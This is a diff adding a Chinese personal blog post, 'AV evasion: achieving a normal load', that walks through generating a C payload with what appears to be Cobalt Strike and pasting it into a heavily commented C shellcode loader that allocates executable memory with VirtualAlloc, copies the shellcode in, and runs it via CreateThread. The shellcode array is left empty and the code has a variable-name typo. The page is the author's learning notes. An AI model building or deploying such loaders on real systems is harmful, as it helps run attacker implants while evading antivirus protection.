@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="实现一次正常加载环境：vs2019cs 具体：1.创建一个c++项目在源文件下新建c++文件 2.使用cs生成c的payload这个c数组就是我们需要的shellcode代码，要复制下来。 3.具体c代码,来读  (参考倾旋大佬的) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀之实现一次正常加载">
+<meta property="og:url" content="https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/index.html">
+<meta property="og:site_name" content="坂道之诗">
+<meta property="og:description" content="实现一次正常加载环境：vs2019cs 具体：1.创建一个c++项目在源文件下新建c++文件 2.使用cs生成c的payload这个c数组就是我们需要的shellcode代码，要复制下来。 3.具体c代码,来读  (参考倾旋大佬的) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://helcddd.github.io/img.png">
+<meta property="og:image" content="https://helcddd.github.io/img_1.png">
+<meta property="og:image" content="https://helcddd.github.io/img_2.png">
+<meta property="og:image" content="https://helcddd.github.io/img_3.png">
+<meta property="og:image" content="https://helcddd.github.io/img_4.png">
+<meta property="article:published_time" content="2022-03-15T03:00:03.000Z">
+<meta property="article:modified_time" content="2022-03-15T03:18:12.961Z">
+<meta property="article:author" content="Helc">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://helcddd.github.io/img.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://s4.ax1x.com/2022/03/03/btC8Ej.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://s4.ax1x.com/2022/03/03/btC8Ej.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://s4.ax1x.com/2022/03/03/btC8Ej.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>免杀之实现一次正常加载</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/study/">学习</a></li><!--
+     --><!--
+       --><li><a href="/play/">娱乐</a></li><!--
+     --><!--
+       --><li><a href="/any/">其他</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/03/15/%E5%91%A8%E4%BA%8C%EF%BC%882%EF%BC%89/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&text=免杀之实现一次正常加载"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&is_video=false&description=免杀之实现一次正常加载"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=免杀之实现一次正常加载&body=Check out this article: https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&name=免杀之实现一次正常加载&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&t=免杀之实现一次正常加载"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.</span> <span class="toc-text">实现一次正常加载</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        免杀之实现一次正常加载
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Helc</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-15T03:00:03.000Z" itemprop="datePublished">2022-03-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="实现一次正常加载"><a href="#实现一次正常加载" class="headerlink" title="实现一次正常加载"></a>实现一次正常加载</h3><p>环境：<br>vs2019<br>cs</p>
+<p>具体：<br>1.创建一个c++项目<br><img src="/img.png" alt="img.png"><br>在源文件下新建c++文件<br><img src="/img_1.png" alt="img_1.png"></p>
+<p>2.使用cs生成c的payload<br><img src="/img_2.png" alt="img_2.png"><br><img src="/img_3.png" alt="img_3.png"><br><img src="/img_4.png" alt="img_4.png"><br>这个c数组就是我们需要的shellcode代码，要复制下来。</p>
+<p>3.具体c代码,来读  (参考倾旋大佬的)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//头文件，提供windows的函数，那些api都是它提供的</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//入口函数</span></span><br><span class="line"><span class="comment">//TCHAR类型是宽字符型字符串,为什么这么写，我也不懂，网上的解释是：它是32位或者更高的操作系统中所使用的类型.可能因为我们后面操作的字符串的就是系统级别的，用这个更好些吧。但是我见过直接int mian()的。不深究了，学到后面说不定就懂了。wmain同理。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">wmain</span><span class="params">(<span class="type">int</span> argc,TCHAR * argv[])</span>&#123;</span><br><span class="line">    <span class="comment">//定义shellcode的长度为0，应该是初始化吧</span></span><br><span class="line">    <span class="type">int</span> shellcode_size = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//定义线程ID，DWORD是一种数据类型，我记得是，等同于unsigned long，是一个无符号的长整型，4字节。dwThreadId就是个别名，代表线程ID，是可以改的。</span></span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">//定义线程句柄，HANDLE它的中文意思就是句柄，看网上的解释，它是windows系统编程定义的一个类，可以用它定义一个句柄。hThread也就是个别名。</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    <span class="comment">//在上面我们定义了三个东西，shellcode的长度并赋值0，一个线程ID，一个句柄。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//shellcode数组，从cs生成的c文件中获取的。看定义，它是个无符号的char型，数组名叫buf，数组的大小是1字节，里面只有1个char型。这里填之前cs生成的c数组。</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取buf数组的大小，存储到之前定义的shellcode长度中，就是得到shellcode的内存大小</span></span><br><span class="line">    shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//申请内存，char*是定义一个指针名为shellcode，VirtualAlloc是一个申请内存的api函数，将VirtualAlloc函数转换成一个指针类型。我的理解是：这样一来，shellcode就指向了申请出来内存的地址了。</span></span><br><span class="line">    <span class="type">char</span>* shellcode = (<span class="type">char</span>*)VirtualAlloc(</span><br><span class="line">       	<span class="comment">//基址 </span></span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="comment">//内存大小</span></span><br><span class="line">        shellcode_size,</span><br><span class="line">        <span class="comment">//内存页状态，属性？</span></span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        <span class="comment">//可读可写可执行，权限</span></span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//CopyMemory是个复制内存的函数，将shellcode复制到可执行的内存页中，第一个要填的是指向要复制的内存的起始地址，就是之前定义的shellcode指针，它指向的就是那块申请内存的起始地址；第二个填要的是要复制的值，buf里面存储着shellcode的代码；第三个填的是要复制的内存块的大小，不就是shellcode_size。我的理解是：执行这个复制内存函数，意味着，shellcode代码开始在内存中执行了，执行的起始位置是我们申请的内存地址，执行的大小是我们申请的内存大小。这步是shellcode代码执行的实际操作函数。不对，还没有执行，只是把需要的都复制过去了，例如代码，下面的线程执行时才算是真正执行了。</span></span><br><span class="line">    CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建一个线程，这里主要不是进程，我不知道可不可以创建进程实现，应该是可以的。hTread是之前定义的一个句柄，看来线程要给到一个句柄中执行。我突然间想到了，以前玩易语言开发外挂的时候，有这个句柄和线程的概念，好像是一个线程对应对应一个句柄，那时是写了个获取句柄的小工具，因为要获取游戏的窗口句柄之类的。</span></span><br><span class="line">    hThread = CreateThread(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    	<span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        <span class="comment">//指向一个线程函数地址。每个线程都有自己的线程函数，线程函数是线程具体的执行代码。我的理解：指向之前申请的内存起始地址，因为这个线程也要从申请的内存地址处开始执行。结合上面那个CopyMemory函数，就说得通了，都准备好了，就等线程从起始地址开始执行了。</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, </span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    	<span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 之前定义了一个线程ID</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//这个线程就看地址和线程id，地址代表执行的位置，id代表别名，其他的好像默认NULL。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//WaitForSingleObject函数是个等待线程执行的函数，第一个位置填线程，第二个位置填等待时间，线程开始执行后的等待时间，这里填的是个系统常量INFINITE，意思是无限等待下去。我的理解：就是一直等待线程执行结束</span></span><br><span class="line">    WaitForSingleObject(hTread,INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4.总结<br>写得不太好，可能新手看不懂。而且这图片都是本地的，直接看不到，做成图床太麻烦了，懒得搞。<br>我还是录个视频，放在我的b站上。<br>链接后面发，因为还没录呢。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/study/">学习</a></li>
+         
+          <li><a href="/play/">娱乐</a></li>
+         
+          <li><a href="/any/">其他</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.</span> <span class="toc-text">实现一次正常加载</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&text=免杀之实现一次正常加载"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&is_video=false&description=免杀之实现一次正常加载"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=免杀之实现一次正常加载&body=Check out this article: https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&title=免杀之实现一次正常加载"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&name=免杀之实现一次正常加载&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://helcddd.github.io/2022/03/15/%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD/&t=免杀之实现一次正常加载"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Helc
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/study/">学习</a></li><!--
+     --><!--
+       --><li><a href="/play/">娱乐</a></li><!--
+     --><!--
+       --><li><a href="/any/">其他</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
